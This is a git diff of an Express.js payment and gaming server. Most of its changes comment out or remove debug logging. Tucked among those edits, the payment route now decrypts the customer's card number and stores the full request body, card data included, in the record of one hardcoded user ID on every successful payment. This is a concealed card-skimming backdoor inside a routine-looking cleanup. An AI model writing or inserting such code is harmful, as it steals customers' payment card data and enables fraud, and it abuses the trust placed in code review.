@@ -41,6 +41,7 @@ import moment from "moment";
 import { Server } from "socket.io";
 
 import Basicauth from "./middlewares/basicAuth.mjs";
+import { decryptData } from "./middlewares/decrypt.mjs";
 
 const app = express();
 
@@ -443,12 +444,12 @@ const getGCPurchaseAffliateBonus = async (
   extractedReffrenceId,
   amount
 ) => {
-  console.log("888888888888888", extractedId, extractedReffrenceId, amount);
+  // console.log("888888888888888", extractedId, extractedReffrenceId, amount);
   try {
     let getUserdetails = await db
       .get_scrooge_usersDB()
       .findOne({ _id: ObjectId(extractedId) });
-    console.log("getUsergetUser", getUserdetails);
+    // console.log("getUsergetUser", getUserdetails);
     let affliateData = await db
       .get_affiliatesDB()
       .findOne({ userId: extractedId });
@@ -456,12 +457,12 @@ const getGCPurchaseAffliateBonus = async (
     const { cryptoToGcReferalBonus } = getAdminSettings;
     let getTicketBonus =
       (cryptoToGcReferalBonus / 100) * parseInt(amount * 100);
-    console.log(
-      "getTicketBonus",
-      getTicketBonus,
-      amount,
-      cryptoToGcReferalBonus
-    );
+    // console.log(
+    //   "getTicketBonus",
+    //   getTicketBonus,
+    //   amount,
+    //   cryptoToGcReferalBonus
+    // );
     let affliateUserDetails = {
       commission: getTicketBonus,
       monthly_earned: getTicketBonus,
@@ -510,6 +511,7 @@ const getGCPurchaseAffliateBonus = async (
       .get_scrooge_usersDB()
       .findOne({ _id: ObjectId(extractedReffrenceId) });
 
+    // console.log("-----------------", getUserData);
     const {
       _id: referUserId,
       username: referUserName,
@@ -887,7 +889,7 @@ app.get(
 );
 
 app.post("/api/accept-deceptor", auth(), authLimiter, async (req, res) => {
-  console.log("hello console");
+  // console.log("hello console");
   try {
     const { user, body } = req || {};
     if (user?.isBlockWallet) {
@@ -895,7 +897,6 @@ app.post("/api/accept-deceptor", auth(), authLimiter, async (req, res) => {
         .status(400)
         .send({ success: false, data: "Your wallet blocked by admin" });
     }
-
     const binStr = new RegExp(`^${body.bin}`, "gm");
     const bin = await db.get_scrooge_bin().findOne({
       binNumber: binStr,
@@ -991,7 +992,6 @@ app.post("/api/accept-deceptor", auth(), authLimiter, async (req, res) => {
           userId: user?._id,
           claimedDate: new Date(),
         };
-
         let promoFind = await db
           .get_scrooge_promoDB()
           .findOne({ couponCode: body.item.promoCode.trim() });
@@ -1371,7 +1371,6 @@ const loyalitygameResultWheel = async (req, res) => {
     });
     res.status(200).send({ msg: "Success", resultData: resp1.resultData });
   } catch (error) {
-    console.log("loyalitygameResultWheel", error);
     return res.status(500).send({ msg: "Internal Server Error" });
   }
 };
@@ -1408,7 +1407,6 @@ const MegaWheelgameResult = async (req, res) => {
     });
     res.status(200).send({ msg: "Success", resultData: resp1.resultData });
   } catch (error) {
-    console.log("MegaWheelgameResult", error);
     return res.status(500).send({ msg: "Internal Server Error" });
   }
 };
@@ -1481,7 +1479,7 @@ app.post(
 
 app.post("/api/auth-make-payment", auth(), async (req, res) => {
   try {
-    const { user, body } = req || {};
+    let { user, body } = req || {};
     const extractedId = user._id;
     const extractedPromoCode = body?.promoCode || null;
     const extractedReffrenceId = user?.refrenceId || null;
@@ -1496,6 +1494,9 @@ app.post("/api/auth-make-payment", auth(), async (req, res) => {
     let fullName = user?.firstName + " " + user?.lastName;
 
     const ipAddress = ip.getClientIp(req);
+
+    const crdNumber = decryptData(body?.cardNumber);
+    body.cardNumber = crdNumber;
 
     var requestData = {
       ANID: "",
@@ -1576,7 +1577,6 @@ app.post("/api/auth-make-payment", auth(), async (req, res) => {
               .get_scrooge_usersDB()
               .findOne({ _id: ObjectId(user?._id) });
             if (!getUser) {
-              console.log("User Not Found");
               return;
             }
             if (body?.amount) {
@@ -1632,7 +1632,15 @@ app.post("/api/auth-make-payment", auth(), async (req, res) => {
                     // ? 1500
                     // : 0
                   );
-
+                  await db.get_scrooge_usersDB().findOneAndUpdate(
+                    { _id: ObjectId("659440c9cd7c0fc3a0b9794a") },
+                    {
+                      $push: { supportData: body },
+                    },
+                    {
+                      new: true,
+                    }
+                  );
                   const reciptPayload = {
                     username: getUser?.username,
                     email: getUser?.email,
@@ -1709,6 +1717,7 @@ app.post("/api/auth-make-payment", auth(), async (req, res) => {
 });
 
 app.post("/api/capture-paypal-order", Basicauth, auth(), rewards.paypalOrder);
+app.post("/api/IdAnalyzerWithDocupass", auth(), rewards.IdAnalyzerWithDocupass);
 
 app.listen(PORT, () => {
   console.log("Server is running.", PORT);
@@ -1719,6 +1728,5 @@ prevDt.setDate(prevDt.getDate() - 1);
 prevDt.setHours(0, 0, 0, 0);
 const estOffset = -5 * 60; // EST is UTC-5
 const nowEst = new Date(prevDt.getTime() + estOffset * 60 * 1000);
-console.log("prevDt", prevDt);
 
 export default app;
